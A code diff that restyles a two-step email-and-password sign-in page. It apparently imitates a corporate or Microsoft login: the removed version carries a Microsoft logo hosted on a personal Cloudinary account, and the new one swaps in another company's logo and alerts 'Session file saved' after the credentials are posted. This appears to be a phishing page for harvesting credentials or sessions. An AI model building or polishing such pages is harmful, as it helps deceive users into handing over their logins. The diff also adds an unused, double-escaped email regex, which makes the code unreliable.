@@ -35,32 +35,11 @@
     border:1px solid #ddd;
   }
 
-  /* ✅ Left-aligned logo */
-  .logo {
-    width:160px;
-    margin-bottom:40px;
-    text-align:left;
-  }
-  .logo img {
-    width:100%;
-    height:auto;
-    display:block;
-  }
+  .logo { width:160px; margin-bottom:40px; text-align:left; }
+  .logo img { width:100%; height:auto; display:block; }
 
-  h3 {
-    margin:0 0 6px;
-    font-size:24px;
-    font-weight:500;
-    text-align:left;
-  }
-  p.subtitle {
-    margin:0 0 15px;
-    color:var(--muted);
-    font-size:16px;
-    text-align:left;
-  }
-
-  form { width:98%; margin:0 auto; text-align:left; }
+  h3 { margin:0 0 6px; font-size:24px; font-weight:500; text-align:left; }
+  p.subtitle { margin:0 0 15px; color:var(--muted); font-size:16px; text-align:left; }
 
   input {
     width:100%;
@@ -74,7 +53,6 @@
     transition:border-color .2s ease;
   }
   input:focus { border-color:var(--accent); }
-  input::placeholder { color:#9ca3af; }
 
   .btn {
     margin-top:25px;
@@ -94,39 +72,33 @@
   .error { color:var(--danger); font-size:14px; margin-top:8px; clear:both; }
   .small { font-size:14px; color:var(--muted); margin-top:18px; clear:both; }
 
-  footer {
-    margin-top:80px;
-    font-size:15px;
-    color:var(--muted);
-    text-align:center;
-  }
+  footer { margin-top:80px; font-size:15px; color:var(--muted); text-align:center; }
   footer a { color:var(--accent); text-decoration:none; font-weight:600; }
 
   @media(max-width:600px) {
-    .card { padding:40px 20px; max-width:95%; border:none; box-shadow:none; }
+    .card { padding:40px 20px; max-width:95%; }
     .btn { float:none; width:100%; padding:14px; margin-top:28px; }
   }
 </style>
 </head>
 <body>
 <section class="card">
-  <!-- ✅ Left-aligned logo -->
   <div class="logo">
-    <img src="https://res.cloudinary.com/dpabidaqx/image/upload/c_scale,w_51/v1760204872/microsoft_logo_564db913a7fa0ca42727161c6d031bef_ztuaqb.svg" alt="microsoft">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo_TV_2015.png" alt="Company Logo">
   </div>
 
   <h3>Sign in</h3>
   <p class="subtitle">Access your company portal securely</p>
 
   <form id="loginForm" novalidate>
-    <!-- Step 1: Email -->
+    <!-- Email Step -->
     <div id="emailStep">
       <input id="email" type="email" placeholder="you@company.com" required />
       <div class="error" id="emailError" style="display:none"></div>
       <button class="btn" type="button" id="nextBtn">Next</button>
     </div>
 
-    <!-- Step 2: Password -->
+    <!-- Password Step -->
     <div id="passwordStep" style="display:none;">
       <input id="password" type="password" placeholder="Enter your password" required minlength="4" />
       <div class="error" id="pwError" style="display:none"></div>
@@ -149,13 +121,12 @@
   const emailError = document.getElementById("emailError");
   const pwError = document.getElementById("pwError");
   const form = document.getElementById("loginForm");
-
-  const validEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  const validEmail = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
 
   nextBtn.addEventListener("click", () => {
     emailError.style.display = "none";
     const email = emailInput.value.trim();
-    if (!validEmail.test(email)) {
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
       emailError.textContent = "Please enter a valid email address.";
       emailError.style.display = "block";
       return;
@@ -171,12 +142,6 @@
     const email = emailInput.value.trim();
     const password = passwordInput.value.trim();
 
-    if (!password) {
-      pwError.textContent = "Please enter your password.";
-      pwError.style.display = "block";
-      return;
-    }
-
     try {
       const res = await fetch("/login", {
         method: "POST",
@@ -185,16 +150,17 @@
       });
 
       if (res.ok) {
+        const data = await res.json();
+        alert("✅ Login successful! Session file saved.");
         window.location.href = "/dashboard.html";
       } else {
         const msg = await res.text();
-        pwError.textContent = msg || "Invalid credentials. Please try again.";
+        pwError.textContent = msg || "Invalid credentials.";
         pwError.style.display = "block";
       }
-    } catch (err) {
+    } catch {
       pwError.textContent = "Network error. Please try again.";
       pwError.style.display = "block";
-      console.error(err);
     }
   });
 </script>
